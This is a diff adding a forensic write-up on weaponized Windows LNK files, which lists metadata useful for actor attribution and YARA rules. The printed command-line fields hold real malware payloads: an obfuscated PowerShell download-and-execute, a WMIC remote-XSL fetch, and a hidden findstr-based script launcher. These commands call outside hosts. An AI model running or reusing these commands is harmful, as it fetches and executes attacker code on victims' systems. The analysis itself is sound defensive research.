@@ -1,0 +1,157 @@
+Metadata from weaponized LNK files can provide insight into the actor's development 
+environment.  The SID provides insight into the user account used, and can be used as
+a search string (as well as in a Yara rule).  The volume serial number, machine ID (aka,
+NetBIOS name), and the node ID (aka, MAC address) can also be used in a Yara rule.
+
+-------------------------------------------------------------------------------------
+https://www.virustotal.com/gui/file/3b4ec70681e528663dee39c5c6ebceec2b7ddf09707a78df20cae3b7b807fac5/detection
+MD5: 5d357f666e7727b18f8150d53d28d257
+
+Metadata:
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Wed Apr 11 23:35:27 2018 Z
+atime              Wed Apr 11 23:35:27 2018 Z
+ctime              Wed Apr 11 23:35:27 2018 Z
+workingdir         %SYSTEMROOT%\System32\WindowsPowerShell\v1.0
+basepath           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+description        AVI
+shitemidlist       My Computer/C:\/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+**Shell Items Details (times in UTC)**
+  C:2018-04-11 21:04:34  M:2018-11-16 21:29:56  A:2018-11-16 21:29:56 Windows (9)
+  C:2018-04-11 21:04:34  M:2018-11-21 17:32:02  A:2018-11-21 17:32:02 System32 (9)
+  C:2018-04-11 23:38:22  M:2018-04-11 23:38:22  A:2018-06-28 23:05:46 WindowsPowerShell (9)
+  C:2018-04-11 23:38:22  M:2018-06-28 23:04:20  A:2018-06-28 23:04:20 v1.0 (9)
+  C:2018-04-11 23:35:28  M:2018-04-11 23:35:28  A:2018-04-11 23:35:28 powershell.exe (9)
+vol_sn             CA05-2569
+vol_type           Fixed Disk
+commandline        -NoPr -WINd 1 -eXEc ByP   iex ("$( SeT-ITeM  'VariaBle:OFS' '')"+[StRING][CHAr[]] (73 ,69, 88, 40, 78,101 , 119 , 45, 79 ,98,106,101 , 99,116,32 ,83,121,115 ,116 ,101 ,109, 46, 78 , 101,116,46,87 , 101, 98 ,67,108 ,105 , 101 , 110 , 116, 41,46 , 68,111 ,119 ,110, 108, 111,97 , 100, 83 , 116 ,114,105,110,103 ,40, 39, 104 ,116 ,116,112,58 ,47 ,47,107 ,108 ,105, 115 ,46 ,105 , 99 , 117,47 ,49 , 39,41)+"$(SEt-VARiAbLe 'OfS'  ' ' ) ")
+iconfilename       C:\WINDOWS\System32\imageres.dll
+hotkey             0x0
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasWorkingDir|HasExpIcon|HasLinkInfo|HasArguments|HasName|HasIconLocation|HasRelativePath
+
+***PropertyStoreDataBlock***
+GUID/ID pairs:
+{446d16b1-8dad-4870-a748-402ea43d788c}/104
+{46588ae2-4cbc-4338-bbfc-139326986dce}/4      SID: S-1-5-21-1607665944-3235443811-1991609163-1001
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : x10-slim
+New Droid ID Time     : Sun Jul 29 22:57:38 2018 UTC
+New Droid ID Seq Num  : 5969
+New Droid    Node ID  : e8:9e:b4:3a:a3:ea
+Birth Droid ID Time   : Sun Jul 29 22:57:38 2018 UTC
+Birth Droid ID Seq Num: 5969
+Birth Droid Node ID   : e8:9e:b4:3a:a3:ea
+
+-------------------------------------------------------------------------------------
+https://www.virustotal.com/gui/file/695e03c97eaed0303c9527e579e69b1ba280c448476edcf97d7a289b439fa39a/detection
+https://hybrid-analysis.com/sample/695e03c97eaed0303c9527e579e69b1ba280c448476edcf97d7a289b439fa39a?environmentId=100
+MD5: 0b12bdcfa497422aedf092729325ff6d
+
+Note: In this LNK file, the time stamps within the shell items were visually/manually
+verified as being zero'd out.  There also appear to be other modifications to the file,
+as well, as well as a description field.
+
+Metadata:
+guid               {00021401-0000-0000-c000-000000000046}
+description        44OFxmd8rhESizmd7i26IOKcvjd7gt6IFqcv
+shitemidlist       My Computer/C:\/WINDOWS/system32/cmd.exe
+**Shell Items Details (times in UTC)**
+  C:0                   M:0                   A:0                  WINDOWS (9)
+  C:0                   M:0                   A:0                  system32 (9)
+  C:0                   M:0                   A:0                  cmd.exe (9)
+commandline        /k start /MIN %SystemRoot%\\system32\\wbem\\WMIC.exe os get /format:"http://t9UHncbrj.iceyavod.com:25073/03/vv.xsl?13102507390dOIrmxm" && exit
+iconfilename       %SystemRoot%\system32\imageres.dll
+hotkey             0x0
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasArguments|HasName|HasIconLocation
+
+***PropertyStoreDataBlock***
+GUID/ID pairs:
+{46588ae2-4cbc-4338-bbfc-139326986dce}/4      SID: S-1-5-21-1051504378-1802116228-1550938009-1001
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+-------------------------------------------------------------------------------------
+LNK avialable for download:
+https://iris-h.services/#/pages/workbench/19cd922cac02acd24b7b6c3d01df5b0b29f52eab
+
+This LNK file is interesting, in that the actual command run is appended to the end 
+of the LNK file itself.  In this case, the word "dikona" is used throughout the script.
+Windows Defender detects that LNK file as BITS abuse, as the embedded script uses 
+bitsadmin.exe to download a file.
+
+MD5: 877a283be8cd033a144f9d3324e7a0b0
+
+Metadata:
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Tue Jul 14 01:39:20 2009 Z
+atime              Mon Jul 13 23:49:07 2009 Z
+ctime              Mon Jul 13 23:49:07 2009 Z
+basepath           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+shitemidlist       My Computer/C:\/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+**Shell Items Details (times in UTC)**
+  C:2009-07-14 03:20:10  M:2018-09-07 06:18:28  A:2018-09-07 06:18:28 Windows (8)
+  C:2009-07-14 03:20:12  M:2018-09-07 06:12:28  A:2018-09-07 06:12:28 System32 (8)
+  C:2009-07-14 05:32:40  M:2009-07-14 05:32:40  A:2009-07-14 05:32:40 WindowsPowerShell (8)
+  C:2009-07-14 05:32:40  M:2016-12-19 11:50:30  A:2016-12-19 11:50:30 v1.0 (8)
+  C:2009-07-13 23:49:08  M:2009-07-14 01:39:22  A:2009-07-13 23:49:08 powershell.exe (8)
+vol_sn             9CBC-E47E
+vol_type           Fixed Disk
+commandline        -ep bypass -c "&{powershell -w"in hi"d"den -c {$g=findstr /s dikona $env:userprofile\*.lnk;powershell -c $g}}"
+iconfilename       shell32.dll
+hotkey             0x73
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasLinkInfo|HasArguments|HasIconLocation|HasRelativePath
+
+***PropertyStoreDataBlock***
+GUID/ID pairs:
+{46588ae2-4cbc-4338-bbfc-139326986dce}/4      SID: S-1-5-21-2287413414-4262531481-1086768478-1000
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : pc
+New Droid ID Time     : Fri Sep  9 16:24:17 2016 UTC
+New Droid ID Seq Num  : 7251
+New Droid    Node ID  : 08:d4:0c:47:f8:73
+Birth Droid ID Time   : Fri Sep  9 16:24:17 2016 UTC
+Birth Droid ID Seq Num: 7251
+Birth Droid Node ID   : 08:d4:0c:47:f8:73
+
+-------------------------------------------------------------------------------------
+Below is the metadata for "make_lnk.lnk", a custom crafted LNK file that includes only the
+minimum required for a functioning LNK file.  The LNK file metadata was further modified to
+remove time stamps from the shell items, as well as modify the version number for the shell
+items.
+
+The file can be found here: https://github.com/keydet89/LNK/blob/master/make_lnk.txt
+Note that the file extension was changed to "txt".
+
+File: d:\cases\lnk\make_lnk.lnk
+guid               {00021401-0000-0000-c000-000000000046}
+shitemidlist       My Computer/C:\/Windows/System32 /calc.exe
+**Shell Items Details (times in UTC)**
+  C:0                   M:0                   A:0                  Windows (10)
+  C:0                   M:0                   A:0                  System32  (10)
+  C:0                   M:0                   A:0                  calc.exe  (10)
+hotkey             0x0
+showcmd            0x1
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode
